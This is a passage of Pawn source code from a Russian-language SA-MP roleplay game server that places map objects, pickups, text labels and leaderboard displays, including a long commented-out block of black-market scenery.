	for(new i = 0; i < sizeof(MeriaTop); i++)
	{
		MeriaTopObj[i] = CreateDynamicObject(19483, MeriaTop[i][0], MeriaTop[i][1], MeriaTop[i][2], MeriaTop[i][3], MeriaTop[i][4], MeriaTop[i][5], 55, 33, -1, 500.00, 500.00);
		SetDynamicObjectMaterialText(MeriaTopObj[i], 0, "8. Bred_Pitt", 130, "Ariel", 30, 1, 0xFFFFFFFF, 0x00000000, 0);
		MeriaTopObj1[i] = CreateDynamicObject(19483, MeriaTop1[i][0], MeriaTop1[i][1], MeriaTop1[i][2], MeriaTop1[i][3], MeriaTop1[i][4], MeriaTop1[i][5], 55, 33, -1, 500.00, 500.00);
		SetDynamicObjectMaterialText(MeriaTopObj1[i], 0, "8. Bred_Pitt", 130, "Ariel", 30, 1, 0xFFFFFFFF, 0x00000000, 0);
	}
	for(new i = 0; i < sizeof(GangTop); i++)
	{
		GangTopObj[i] = CreateDynamicObject(19480, GangTop[i][0], GangTop[i][1], GangTop[i][2], GangTop[i][3], GangTop[i][4], GangTop[i][5], 0,0, -1, 300.00, 300.00);
		SetDynamicObjectMaterial(GangTopObj[i], 0, 18642, "taser1", "lightning2-3", 0xFFFF0000);
		SetDynamicObjectMaterialText(GangTopObj[i], 0, "1. ClanNames - NickName", 130, "Monotype Corsiva", 30, 1, 0xFF9A9A9A, 0x00000000, 1);
	}


	for(new i = 0; i < 3; i++)
	{
	    TirSp[i] = CreateDynamicCP(GoTir[i][0],GoTir[i][1],GoTir[i][2], 1.0,2,1);
		CreateDynamic3DTextLabel("[Тир]{ffffff}\nИспользуйте: {f7ae11}LALT",CREWARD,GoTir[i][0],GoTir[i][1],GoTir[i][2],5.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1, 2,1);
	}
	CreateDynamic3DTextLabel("[Внедрение в оранизацию]",CREWARD,1401.8617,-7.8624,1001.9192,5.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1, 66);
	fbiinvite = CreateDynamicPickup(1239,23,1401.8617,-7.8624,1000.9192,66);
	
	/*CreateDynamic3DTextLabel("[Поддельные документы]",CREWARD,1397.1934,-8.0764,1001.9192,5.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1, 66);
	fbibadge = CreateDynamicPickup(1239,23,1397.1934,-8.0764,1000.9192,66);*/
	
    CreateDynamic3DTextLabel("[Устройство прослушки]",CREWARD,1368.3650,-7.6397,1000.9143,5.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1, 66);
	fbipros = CreateDynamicPickup(1239,23,1368.3650,-7.6397,1001.9143,66);

	CreateDynamic3DTextLabel("[Заказ транспорта]",CREWARD,980.9774,1073.7526,11.8130,5.0);
	fbicar = CreateDynamicPickup(1239,23,980.9774,1073.7526,10.8130,0,0);

    CreateDynamic3DTextLabel("[Руда]{ffffff}\nЦена: {f7ae11}50${ffffff}\nИспользуйте: {f7ae11}/tbuy",CREWARD,823.5782,848.4901,12.3206,10.0);
	CreateDynamicPickup(1239,23,823.5782,848.4901,11.3206,0,0);
	shahtapic = CreateDynamicSphere(823.5782,848.4901,11.3206, 5.0);

    CreateDynamic3DTextLabel("[Нефть]{ffffff}\nЦена: {f7ae11}50${ffffff}\nИспользуйте: {f7ae11}/tbuy",CREWARD,640.4448,1256.3571,12.5972,10.0);
	CreateDynamicPickup(1239,23,640.4448,1256.3571,11.5972,0,0);
	oilpic = CreateDynamicSphere(640.4448,1256.3571,11.5972, 5.0);

    CreateDynamic3DTextLabel("[Дерево]{ffffff}\nЦена: {f7ae11}50${ffffff}\nИспользуйте: {f7ae11}/tbuy",CREWARD,-512.4367,-189.3973,79.1887,10.0);
	CreateDynamicPickup(1239,23,-512.4367,-189.3973,78.1887,0,0);
	derevopic = CreateDynamicSphere(-512.4367,-189.3973,78.1887, 5.0);

	portlvtext = CreateDynamic3DTextLabel("-",CREWARD,-2263.9524,2353.1274,6.8460,10.0);
	CreateDynamicPickup(1239,23,-2263.9524,2353.1274,4.8460,0,0);
	portlv = CreateDynamicSphere(-2263.9524,2353.1274,4.8460, 5.0);

    portlstext = CreateDynamic3DTextLabel("-",CREWARD,2769.1313,-2456.3149,15.6432,10.0);
	CreateDynamicPickup(1239,23,2769.1313,-2456.3149,13.6432,0,0);
	portls = CreateDynamicSphere(2769.1313,-2456.3149,13.6432, 5.0);
	
    for(new i = 0; i < 3; i++)
	{
	    lsbankphoto[i] = CreateDynamicSphere(PhotoPosLS[i][0],PhotoPosLS[i][1],PhotoPosLS[i][2],1.0);
	    lvbankphoto[i] = CreateDynamicSphere(PhotoPosLV[i][0],PhotoPosLV[i][1],PhotoPosLV[i][2],1.0);
	}

	policeform = CreateDynamicSphere(1976.4069,1355.3317,1015.4606, 1.0);
//	policeformgrab = CreateDynamicSphere(1980.1738,1350.5265,1015.4606, 1.0);
	armygrab = CreateDynamicSphere(353.5841,1923.5765,17.6406, 1.0);
	util = CreateDynamicSphere(168.9625,2638.3369,17.7211, 5.0);

    staffcom = CreateDynamicSphere(1376.4468,-19.5475,1004.4430,1.0);
	cinghack = CreateDynamicSphere(1377.3737,-14.2666,1004.4440,1.0);
	setbomb = CreateDynamicSphere(1384.1146,0.2671,1000.9153,1.0);

	UpdatePort();



	new map_world, map_int;
	#include <map>
	for(new i;i<sizeof(phonepos);i++)
	{
	    phonepospic[i] = CreateDynamicSphere(phonepos[i][0],phonepos[i][1],phonepos[i][2], 2.0);
		CreateDynamic3DTextLabel("[Телефонная будка]\n{FFFFFF}Нажмите: {f7ae11}LALT",CREWARD,phonepos[i][0],phonepos[i][1],phonepos[i][2],20.0);
	}
	CreateDynamic3DTextLabel("[Биржа]\n{FFFFFF}Нажмите: {f7ae11}LALT",CREWARD,1393.1512,-38.8529,1000.9114,20.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1,6,6);
    CreateDynamicActor(187,1395.0555,-38.5463,1000.9114,91.9100,1,100.0,6);
    
    mysql_tquery(mysql, "SELECT * FROM accounts ORDER BY `bizac` DESC LIMIT 8", "TopAc");
    
   	for(new i; i < sizeof(MusorPos); i++)
	{
	    MusorObject[i] = CreateDynamicObjectEx(1334, MusorPos[i][0], MusorPos[i][1], MusorPos[i][2], 0, 0, MusorPos[i][3]+180,80.00);
	    MusorText[i] = CreateDynamic3DTextLabel("Мусор: {f7ae11}100/100%", -1, MusorPos[i][0], MusorPos[i][1], MusorPos[i][2], 20.0);
	}
	for(new i = 0; i < 5; i++)
	{
	    bandobj[i][0] = CreateDynamicObject(19483, gangtop[i][GangObj][0], gangtop[i][GangObj][1], gangtop[i][GangObj][2], gangtop[i][GangObj][3], gangtop[i][GangObj][4], gangtop[i][GangObj][5], 0,0, -1, 300.00, 300.00);
        SetDynamicObjectMaterialText(bandobj[i][0], 0, "5. Player_Nickname", 130, "Comic Sans MS", 55, 1, 0xFFFFFFFF, 0x00000000, 1);
		bandobj[i][1] = CreateDynamicObject(19483, gangtop[i][GangObj1][0], gangtop[i][GangObj1][1], gangtop[i][GangObj1][2], gangtop[i][GangObj1][3], gangtop[i][GangObj1][4], gangtop[i][GangObj1][5], 0,0, -1, 300.00, 300.00);
        SetDynamicObjectMaterialText(bandobj[i][1], 0, "5. Player_Nickname", 130, "Comic Sans MS", 55, 1, 0xFF9A0000, 0x00000000, 1);
	}
	query = "";
	format(query, sizeof(query), "SELECT * FROM "TABLE_ACCOUNT" WHERE `member` > '5' AND `member` < '11'  ORDER BY `gangscore` DESC LIMIT 5");
	mysql_tquery(mysql, query, "TopGangster", "d",0);


	//meria

	//
	lspd[0]= CreateDynamicObject(968,1544.70789, -1630.89185, 13.03080,   0.00000, 89.00000, 90.00000);
	lspd[1] = CreateDynamicObject(980, 1587.73840, -1638.04297, 14.73610,   0.00000, 0.00000, 0.00000);
	newssp = CreateDynamicSphere(1700.661254, -1281.281005, 15.413556, 10.0);
    hossp = CreateDynamicSphere(1215.81689, -1325.97620, 13.28190, 10.0);
	fbisp = CreateDynamicSphere(1024.976318, 1162.330688, 10.384722, 10.0);
    
    spadmtur = CreateDynamicSphere(302.3612,306.1608,999.148, 150.0);
	sptur = CreateDynamicSphere(0.1507,-20.3048,1999.5859, 150.0);
	sprab = CreateDynamicSphere(2863.409667, -1203.847900, 1023.379577, 150.0);

	lspdsp[0] = CreateDynamicSphere(1544.3741,-1631.9008,13.3828, 1.0);
	lspdspveh[0] = CreateDynamicSphere(1544.3741,-1631.9008,13.3828, 10.0);
	lspdsp[1] = CreateDynamicSphere(1579.9720,-1636.7355,13.5584, 1.0);
	lspdspveh[1] = CreateDynamicSphere(1587.73840, -1638.04297, 14.73610, 10.0);
	//
	CreateDynamicObject(9093, -221.85600, 1088.31567, 20.51700,   0.00000, 0.00000, 90.00000);
//	CreateDynamicObject(9093, 2332.36084, 2098.53662, 11.54500,   0.00000, 0.00000, 180.00000);
    CreateDynamicObject(9093, 1642.60, -1684.47, 14.27, 0.00, 0.00, 0.49);
	CreateDynamicObject(9093, -161.66389, 1108.34766, 20.49730,   0.00000, 0.00000, 90.00000);
	pdlift[0] = CreateDynamicPickup(19134,23,1995.8892,1359.8606,1015.6134,-1,3); //pd 1
	pdlift[1] = CreateDynamicPickup(19134,23,1992.6161,1359.8064,2015.4706,-1,3); //pd 2
	pdlift[2] = CreateDynamicPickup(19134,23,2031.5718,1386.1599,3017.2234,-1,3); //pd 3
	pdlift[3] = CreateDynamicPickup(19134,23,1568.7094,-1689.9719,6.2188,0,0); //park ls
	pdlift[4] = CreateDynamicPickup(19134,23,2297.1116,2451.5105,10.8203,0,0); //park ld
	pdlift[5] = CreateDynamicPickup(19134,23,1564.9011,-1666.7380,28.3956,0,0); //krish ls
	pdlift[6] = CreateDynamicPickup(19134,23,2265.5059,2458.3103,38.6837,0,0); //krish ld
	
	ashlift[0] = CreateDynamicPickup(19134,23,1386.8066,-23.5756,1000.9153,1,1); //ash 1
	ashlift[1] = CreateDynamicPickup(19134,23,1386.9119,2.0275,1000.9153,2,1); //ash 2
	
	hoslift[0] = CreateDynamicPickup(19134,23,1422.8212,-32.4778,1000.9153,2,2); //bolka 1
	hoslift[1] = CreateDynamicPickup(19134,23,1422.8368,-5.0106,1000.9133,3,2); //bolka 2
	
	fbilift[0] = CreateDynamicPickup(19134,23,1412.4381,-12.0910,1000.9153,65,35); // 1
	fbilift[1] = CreateDynamicPickup(19134,23,1388.9683,11.6403,1000.9153,66,35); // 2
	fbilift[2] = CreateDynamicPickup(19134,23,1389.0526,11.5635,1000.9153,67,35); //3
	fbilift[3] = CreateDynamicPickup(19134,23,995.1729,1089.3896,2997.7656,4,95); //парковка
	



	
	
    numberpic[0] = CreateDynamicPickup(19134,14,1542.9429,-1609.7428,14.9334,0);
    numberpic[1] = CreateDynamicPickup(19134,14,2241.3398,2433.7983,12.2037,0);
	new Float:pdx,Float:pdy,Float:pdz,Float:prdrz;
    for(new i = 0; i < 16; i++)
	{
		GetDynamicObjectPos(doorpd[i],pdx,pdy,pdz);
		GetDynamicObjectRot(doorpd[i],prdrz,prdrz,prdrz);
		doorsp[i] = CreateDynamicSphere(pdx,pdy,pdz, 3.0,-1,3);
		Streamer_SetFloatData(STREAMER_TYPE_OBJECT, doorpd[i], E_STREAMER_R_Z, prdrz);
		Streamer_SetFloatData(STREAMER_TYPE_OBJECT, doorpd1[i], E_STREAMER_R_Z, prdrz);
	}
    CreateDynamicPickup(19134,23,996.5458,1070.7799,10.8203,0);
	fbipark = CreateDynamicSphere(996.5458,1070.7799,10.8203, 2.0);
	CreateDynamic3DTextLabel("Подземный паркинг\nИспользуйте: {f7ae11}H",0xFFFFFFFF,996.5458,1070.7799,10.8203+2.0,5.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1, 0);

    CreateDynamicPickup(19134,23,1015.4460,1055.8969,2997.2297,95);
	CreateDynamic3DTextLabel("Выезд\nИспользуйте: {f7ae11}H",0xFFFFFFFF,1015.4460,1055.8969,2997.2297+2.0,5.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1, 95);

    CreateDynamicPickup(19134,23,1430.3615,-1827.6766,13.5469,0);
	meriapark = CreateDynamicSphere(1430.3615,-1827.6766,13.5469, 2.0);
	CreateDynamic3DTextLabel("Подземный паркинг\nИспользуйте: {f7ae11}H",0xFFFFFFFF,1430.3615,-1827.6766,13.5469+2.0,5.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1, 0);

	CreateDynamicPickup(19134,23,1015.4460,1055.8969,2997.2297,90);
	CreateDynamic3DTextLabel("Выезд\nИспользуйте: {f7ae11}H",0xFFFFFFFF,1015.4460,1055.8969,2997.2297+2.0,5.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1, 90);


	tmpobjid = CreateObject(7244, 2481.966308, 2275.136230, 999.529724, 0.000000, 0.000000, 0.000000);
	SetObjectMaterial(tmpobjid, 11, 14789, "ab_sfgymmain", "CBchallenge_256", 0x00000000);
	tmpobjid = CreateDynamicObject(5726, 2500.671386, 2317.874755, 992.761230, 0.000000, 0.000000, -89.899948);
	SetDynamicObjectMaterial(tmpobjid, 2, 13139, "cecuntetunnel", "conc_wall_stripd128H", 0x00000000);
	tmpobjid = CreateDynamicObject(9093, 2431.190185, 2270.943847, 992.126586, 0.000000, 0.000000, 180.000000);


	//bolka

	//черный рынок в лс
/*	CreateDynamicObjectEx(9361,2467.3000000,-1898.0000000,15.1000000,0.0000000,0.0000000,46.0000000); //object(boatoffice_sfn) (1)
	CreateDynamicObjectEx(853,2466.3000000,-1887.1000000,12.9000000,0.0000000,0.0000000,0.0000000); //object(cj_urb_rub_5) (1)
	CreateDynamicObjectEx(850,2457.3000000,-1881.3000000,12.7000000,0.0000000,0.0000000,0.0000000); //object(cj_urb_rub_1) (1)
	CreateDynamicObjectEx(2840,2458.0976600,-1892.1171900,12.3419700,0.0000000,0.0000000,0.0000000); //object(gb_takeaway05) (1)
	CreateDynamicObjectEx(910,2463.0000000,-1901.4000000,13.8000000,0.0000000,0.0000000,228.0000000); //object(bust_cabinet_4) (1)
	CreateDynamicObjectEx(2971,2460.3999000,-1901.0000000,12.5000000,0.0000000,0.0000000,0.0000000); //object(k_smashboxes) (1)
	CreateDynamicObjectEx(2971,2479.3999000,-1897.5000000,12.5000000,0.0000000,0.0000000,0.0000000); //object(k_smashboxes) (2)
	CreateDynamicObjectEx(1442,2457.0000000,-1890.3000000,13.1000000,0.0000000,0.0000000,0.0000000); //object(dyn_firebin0) (1)
	CreateDynamicObjectEx(1440,2463.2000000,-1898.1000000,13.1000000,0.0000000,0.0000000,86.0000000); //object(dyn_box_pile_3) (1)
	CreateDynamicObjectEx(1439,2458.5000000,-1901.9000000,12.5000000,0.0000000,0.0000000,184.0000000); //object(dyn_dumpster_1) (1)
	CreateDynamicObjectEx(12957,2478.3999000,-1881.2000000,13.4000000,0.0000000,0.0000000,222.0000000); //object(sw_pickupwreck01) (1)
	CreateDynamicObjectEx(1264,2462.0000000,-1900.3000000,13.0000000,0.0000000,0.0000000,0.0000000); //object(blackbag1) (1)
	CreateDynamicObjectEx(2672,2462.2000000,-1888.7000000,12.8000000,0.0000000,0.0000000,0.0000000); //object(proc_rubbish_4) (1)
	CreateDynamicObjectEx(2674,2461.5000000,-1891.0000000,12.6000000,0.0000000,0.0000000,0.0000000); //object(proc_rubbish_2) (1)
	CreateDynamicObjectEx(2675,2464.1001000,-1890.4000000,12.6000000,0.0000000,0.0000000,0.0000000); //object(proc_rubbish_6) (1)
	CreateDynamicObjectEx(2676,2462.5000000,-1887.1000000,12.7000000,0.0000000,0.0000000,0.0000000); //object(proc_rubbish_8) (1)
	CreateDynamicObjectEx(2677,2460.0000000,-1888.9000000,12.8000000,0.0000000,0.0000000,0.0000000); //object(proc_rubbish_7) (1)
	CreateDynamicObjectEx(2670,2462.8999000,-1885.8000000,12.6000000,0.0000000,0.0000000,0.0000000); //object(proc_rubbish_1) (1)
	CreateDynamicObjectEx(2671,2462.3000000,-1889.8000000,12.5000000,0.0000000,0.0000000,0.0000000); //object(proc_rubbish_3) (1)
	CreateDynamicObjectEx(2672,2460.0000000,-1891.8000000,12.8000000,0.0000000,0.0000000,0.0000000); //object(proc_rubbish_4) (2)
	CreateDynamicObjectEx(2674,2464.5000000,-1886.2000000,12.6000000,0.0000000,0.0000000,0.0000000); //object(proc_rubbish_2) (2)
	CreateDynamicObjectEx(2671,2467.8000000,-1885.8000000,12.6000000,0.0000000,0.0000000,0.0000000); //object(proc_rubbish_3) (2)
	CreateDynamicObjectEx(2675,2466.6001000,-1890.9000000,12.6000000,0.0000000,0.0000000,0.0000000); //object(proc_rubbish_6) (2)
	CreateDynamicObjectEx(2676,2466.3000000,-1892.0000000,12.7000000,0.0000000,0.0000000,0.0000000); //object(proc_rubbish_8) (2)
	CreateDynamicObjectEx(13591,2445.5000000,-1884.7000000,12.8999900,0.0000000,0.0000000,0.0000000); //object(kickcar28) (1)
	CreateDynamicObjectEx(2674,2472.3000000,-1896.5000000,12.6000000,0.0000000,0.0000000,0.0000000); //object(proc_rubbish_2) (3)
	CreateDynamicObjectEx(2672,2473.3000000,-1898.1000000,12.8000000,0.0000000,0.0000000,0.0000000); //object(proc_rubbish_4) (3)
	CreateDynamicObjectEx(1558,2473.7000000,-1901.5000000,13.1000000,0.0000000,0.0000000,0.0000000); //object(cj_cardbrd_pickup) (1)
	CreateDynamicObjectEx(2677,2461.0000000,-1894.4000000,12.8000000,0.0000000,0.0000000,0.0000000); //object(proc_rubbish_7) (2)
	CreateDynamicObjectEx(2675,2457.5000000,-1894.0000000,12.6000000,0.0000000,0.0000000,0.0000000); //object(proc_rubbish_6) (3)
	CreateDynamicObjectEx(2670,2458.6001000,-1895.5000000,12.6000000,0.0000000,0.0000000,0.0000000); //object(proc_rubbish_1) (2)
	CreateDynamicObjectEx(2672,2454.8000000,-1897.2000000,12.8000000,0.0000000,0.0000000,0.0000000); //object(proc_rubbish_4) (4)
	CreateDynamicObjectEx(2676,2457.3999000,-1897.9000000,12.7000000,0.0000000,0.0000000,0.0000000); //object(proc_rubbish_8) (3)
	CreateDynamicObjectEx(2676,2475.7000000,-1896.7000000,12.7000000,0.0000000,0.0000000,0.0000000);
	//object(proc_rubbish_8) (4)
	CreateDynamicObjectEx(2675,2461.1001000,-1896.7000000,12.6000000,0.0000000,0.0000000,0.0000000); //object(proc_rubbish_6) (4)
	CreateDynamicObjectEx(2673,2457.8000000,-1890.7000000,12.6000000,0.0000000,0.0000000,0.0000000); //object(proc_rubbish_5) (1)
	CreateDynamicObjectEx(2675,2456.1001000,-1889.6000000,12.6000000,0.0000000,0.0000000,0.0000000); //object(proc_rubbish_6) (5)
	CreateDynamicObjectEx(2676,2455.1001000,-1892.5000000,12.7000000,0.0000000,0.0000000,0.0000000); //object(proc_rubbish_8) (5)
	CreateDynamicObjectEx(2672,2457.2000000,-1888.7000000,12.8000000,0.0000000,0.0000000,0.0000000); //object(proc_rubbish_4) (5)
	CreateDynamicObjectEx(2673,2453.5000000,-1895.4000000,12.6000000,0.0000000,0.0000000,0.0000000); //object(proc_rubbish_5) (2)
	CreateDynamicObjectEx(2676,2478.0000000,-1885.5000000,12.7000000,0.0000000,0.0000000,0.0000000); //object(proc_rubbish_8) (6)
	CreateDynamicObjectEx(2674,2478.6001000,-1888.2000000,12.6000000,0.0000000,0.0000000,0.0000000); //object(proc_rubbish_2) (4)
	CreateDynamicObjectEx(2675,2476.6001000,-1889.1000000,12.6000000,0.0000000,0.0000000,0.0000000); //object(proc_rubbish_6) (6)
	CreateDynamicObjectEx(2677,2479.3999000,-1890.6000000,12.8000000,0.0000000,0.0000000,0.0000000); //object(proc_rubbish_7) (3)
	CreateDynamicObjectEx(2672,2477.2000000,-1890.7000000,12.8000000,0.0000000,0.0000000,0.0000000); //object(proc_rubbish_4) (6)
	CreateDynamicObjectEx(2676,2477.3999000,-1893.5000000,12.7000000,0.0000000,0.0000000,0.0000000); //object(proc_rubbish_8) (7)
	CreateDynamicObjectEx(2676,2451.3000000,-1897.5000000,12.7000000,0.0000000,0.0000000,0.0000000); //object(proc_rubbish_8) (8)
	CreateDynamicObjectEx(2673,2455.2000000,-1900.3000000,12.6000000,0.0000000,0.0000000,0.0000000); //object(proc_rubbish_5) (3)
	CreateDynamicObjectEx(2672,2477.5000000,-1900.0000000,12.8000000,0.0000000,0.0000000,0.0000000); //object(proc_rubbish_4) (7)
	CreateDynamicObjectEx(2672,2451.8000000,-1900.1000000,12.8000000,0.0000000,0.0000000,0.0000000); //object(proc_rubbish_4) (8)
	CreateDynamicObjectEx(2674,2458.3000000,-1888.1000000,12.6000000,0.0000000,0.0000000,0.0000000); //object(proc_rubbish_2) (5)
	CreateDynamicObjectEx(2676,2447.8999000,-1899.6000000,12.7000000,0.0000000,0.0000000,0.0000000); //object(proc_rubbish_8) (9)
	CreateDynamicObjectEx(2675,2446.8000000,-1896.7000000,12.6000000,0.0000000,0.0000000,0.0000000); //object(proc_rubbish_6) (7)
	CreateDynamicObjectEx(2672,2445.0000000,-1899.8000000,12.8000000,0.0000000,0.0000000,0.0000000); //object(proc_rubbish_4) (9)
	CreateDynamicObjectEx(2676,2444.8000000,-1895.5000000,12.7000000,0.0000000,0.0000000,0.0000000); //object(proc_rubbish_8) (10)
	CreateDynamicObjectEx(1337,2456.2422000,-1895.5947000,13.0468800,0.0000000,0.0000000,0.0000000); //object(binnt07_la) (1)
	CreateDynamicObjectEx(2677,2443.3000000,-1898.4000000,12.8000000,0.0000000,0.0000000,0.0000000); //object(proc_rubbish_7) (4)
	CreateDynamicObjectEx(2676,2440.3999000,-1899.9000000,12.7000000,0.0000000,0.0000000,0.0000000); //object(proc_rubbish_8) (11)
	CreateDynamicObjectEx(2672,2441.6001000,-1897.3000000,12.8000000,0.0000000,0.0000000,0.0000000); //object(proc_rubbish_4) (10)
	CreateDynamicObjectEx(2670,2448.2000000,-1896.4000000,12.6000000,0.0000000,0.0000000,0.0000000); //object(proc_rubbish_1) (3)
	CreateDynamicObjectEx(2675,2440.8000000,-1895.4000000,12.6000000,0.0000000,0.0000000,0.0000000); //object(proc_rubbish_6) (8)
	CreateDynamicObjectEx(2676,2441.7000000,-1893.5000000,12.7000000,0.0000000,0.0000000,0.0000000); //object(proc_rubbish_8) (12)
	CreateDynamicObjectEx(2670,2446.1001000,-1893.6000000,12.6000000,0.0000000,0.0000000,0.0000000); //object(proc_rubbish_1) (4)
	CreateDynamicObjectEx(2677,2445.6001000,-1892.6000000,12.8000000,0.0000000,0.0000000,0.0000000); //object(proc_rubbish_7) (5)
	CreateDynamicObjectEx(3594,2443.6001000,-1897.6000000,13.2000000,0.0000000,0.0000000,92.0000000); //object(la_fuckcar1) (3)
	CreateDynamicObjectEx(2205,2466.0000000,-1899.6000000,12.7000000,0.0000000,0.0000000,0.0000000); //object(med_office8_desk_1) (1)
	CreateDynamicObjectEx(1728,2444.5000000,-1890.9000000,12.5000000,0.0000000,0.0000000,180.0000000); //object(mrk_seating3) (1)
	CreateDynamicObjectEx(1728,2445.8000000,-1888.0000000,12.5000000,0.0000000,0.0000000,264.0000000); //object(mrk_seating3) (2)
	CreateDynamicObjectEx(1728,2441.3000000,-1890.1000000,12.5000000,0.0000000,0.0000000,94.0000000); //object(mrk_seating3) (3)
	CreateDynamicObjectEx(1827,2443.5000000,-1888.7000000,12.5000000,0.0000000,0.0000000,0.0000000); //object(man_sdr_tables) (1)
	CreateDynamicObjectEx(1665,2443.3999000,-1888.9000000,12.9900000,0.0000000,0.0000000,0.0000000); //object(propashtray1) (1)
	CreateDynamicObjectEx(1951,2443.7000000,-1888.3000000,13.2000000,0.0000000,0.0000000,0.0000000); //object(kb_beer01) (1)
	CreateDynamicObjectEx(1950,2443.0000000,-1888.7000000,13.2000000,0.0000000,0.0000000,0.0000000); //object(kb_beer) (1)
	CreateDynamicObjectEx(3594,1658.3000000,-1814.0000000,13.2000000,0.0000000,0.0000000,0.0000000); //object(la_fuckcar1) (1)
	CreateDynamicObjectEx(3168,1656.7000000,-1836.4000000,12.5000000,0.0000000,0.0000000,0.0000000); //object(trailer2_01) (1)
	CreateDynamicObjectEx(1299,1648.9000000,-1830.7000000,13.0000000,0.0000000,0.0000000,0.0000000); //object(smashboxpile) (1)
	CreateDynamicObjectEx(12957,1646.1000000,-1837.4000000,13.4000000,0.0000000,0.0000000,230.0000000); //object(sw_pickupwreck01) (1)
	CreateDynamicObjectEx(1264,1648.0000000,-1828.7000000,13.0000000,0.0000000,0.0000000,0.0000000); //object(blackbag1) (1)
	CreateDynamicObjectEx(1334,1657.5000000,-1819.2000000,13.7000000,0.0000000,0.0000000,90.0000000); //object(binnt04_la) (1)
	CreateDynamicObjectEx(1334,1657.6000000,-1822.4000000,13.7000000,0.0000000,0.0000000,270.0000000); //object(binnt04_la) (2)
	CreateDynamicObjectEx(3594,1631.0000000,-1843.4000000,13.2000000,0.0000000,0.0000000,226.0000000); //object(la_fuckcar1) (2)
	CreateDynamicObjectEx(3593,1655.6000000,-1803.5000000,13.3000000,0.0000000,0.0000000,324.0000000); //object(la_fuckcar2) (1)
	CreateDynamicObjectEx(1299,1649.7000000,-1830.1000000,13.0000000,0.0000000,0.0000000,0.0000000); //object(smashboxpile) (2)
	CreateDynamicObjectEx(2673,1642.2000000,-1829.4000000,12.6000000,0.0000000,0.0000000,0.0000000); //object(proc_rubbish_5) (1)
	CreateDynamicObjectEx(2672,1643.6000000,-1830.1000000,12.8000000,0.0000000,0.0000000,0.0000000); //object(proc_rubbish_4) (1)
	CreateDynamicObjectEx(2671,1641.3000000,-1828.7000000,12.5000000,0.0000000,0.0000000,0.0000000); //object(proc_rubbish_3) (1)
	CreateDynamicObjectEx(2670,1645.0000000,-1831.1000000,12.6000000,0.0000000,0.0000000,0.0000000); //object(proc_rubbish_1) (1)
	CreateDynamicObjectEx(2676,1647.9000000,-1832.3000000,12.7000000,0.0000000,0.0000000,0.0000000); //object(proc_rubbish_8) (1)
	CreateDynamicObjectEx(2677,1645.1000000,-1831.1000000,12.8000000,0.0000000,0.0000000,0.0000000); //object(proc_rubbish_7) (1)
	CreateDynamicObjectEx(2671,1652.8000000,-1833.6000000,12.6000000,0.0000000,0.0000000,0.0000000); //object(proc_rubbish_3) (2)
	CreateDynamicObjectEx(2674,1632.3000000,-1834.5000000,22.8000000,0.0000000,0.0000000,0.0000000); //object(proc_rubbish_2) (1)
	CreateDynamicObjectEx(2675,1649.5000000,-1835.7000000,12.6000000,0.0000000,0.0000000,0.0000000); //object(proc_rubbish_6) (1)
	CreateDynamicObjectEx(2673,1651.1000000,-1837.3000000,12.6000000,0.0000000,0.0000000,0.0000000); //object(proc_rubbish_5) (2)
	CreateDynamicObjectEx(2671,1649.7000000,-1826.4000000,12.6000000,0.0000000,0.0000000,0.0000000); //object(proc_rubbish_3) (3)
	CreateDynamicObjectEx(2677,1647.4000000,-1834.7000000,12.8000000,0.0000000,0.0000000,0.0000000); //object(proc_rubbish_7) (2)
	CreateDynamicObjectEx(2674,1642.9000000,-1832.2000000,12.6000000,0.0000000,0.0000000,0.0000000); //object(proc_rubbish_2) (2)
	CreateDynamicObjectEx(2670,1652.4000000,-1837.8000000,12.6000000,0.0000000,0.0000000,0.0000000); //object(proc_rubbish_1) (2)
	CreateDynamicObjectEx(2671,1653.3000000,-1824.9000000,12.7000000,0.0000000,0.0000000,0.0000000); //object(proc_rubbish_3) (4)
	CreateDynamicObjectEx(2675,1652.5000000,-1840.0000000,12.6000000,0.0000000,0.0000000,0.0000000); //object(proc_rubbish_6) (2)
	CreateDynamicObjectEx(2670,1652.4000000,-1836.2000000,12.6000000,0.0000000,0.0000000,0.0000000); //object(proc_rubbish_1) (3)
	CreateDynamicObjectEx(3594,1652.2000000,-1801.9000000,13.2000000,0.0000000,0.0000000,328.0000000); //object(la_fuckcar1) (3)
	CreateDynamicObjectEx(1366,1627.0000000,-1864.2000000,13.2000000,0.0000000,0.0000000,0.0000000); //object(cj_firehydrant) (1)
	CreateDynamicObjectEx(955,1654.9000200,-1832.1999500,13.0000000,0.0000000,0.0000000,266.0000000); //object(cj_ext_sprunk) (1)
	CreateDynamicObjectEx(3119,1650.3000000,-1839.4000000,12.8000000,0.0000000,0.0000000,0.0000000); //object(cs_ry_props) (1)
	CreateDynamicObjectEx(1438,1650.9000000,-1824.9000000,12.5000000,0.0000000,0.0000000,0.0000000); //object(dyn_box_pile_2) (1)
	CreateDynamicObjectEx(3566,1610.6000000,-1824.9000000,14.9000000,0.0000000,0.0000000,92.0000000); //object(lasntrk1) (1)
	CreateDynamicObjectEx(3568,1611.0000000,-1836.4000000,15.1000000,0.0000000,0.0000000,92.0000000); //object(lasntrk2) (1
	CreateDynamicObjectEx(3594,1637.9004000,-1843.0996000,13.2000000,0.0000000,0.0000000,305.9970000); //object(la_fuckcar1) (4)
	CreateDynamicObjectEx(13591,1654.7002000,-1827.2002000,12.9000000,0.0000000,0.0000000,177.9950000); //object(kickcar28) (2)
	CreateDynamicObjectEx(3594,1653.4004000,-1810.0000000,13.2000000,0.0000000,0.0000000,39.9960000); //object(la_fuckcar1) (5)
	CreateDynamicObjectEx(3594,1652.2000000,-1816.0000000,13.2000000,0.0000000,0.0000000,301.9960000); //object(la_fuckcar1) (6)
	CreateDynamicObjectEx(3593,1653.5000000,-1804.0000000,14.1000000,0.0000000,0.0000000,53.9980000); //object(la_fuckcar2) (2)
	CreateDynamicObjectEx(3594,1655.5000000,-1812.2000000,14.3700000,0.0000000,0.0000000,43.9960000); //object(la_fuckcar1) (7)
	CreateDynamicObjectEx(3594,1647.3000000,-1811.6000000,13.2000000,0.0000000,0.0000000,235.9960000); //object(la_fuckcar1) (8)
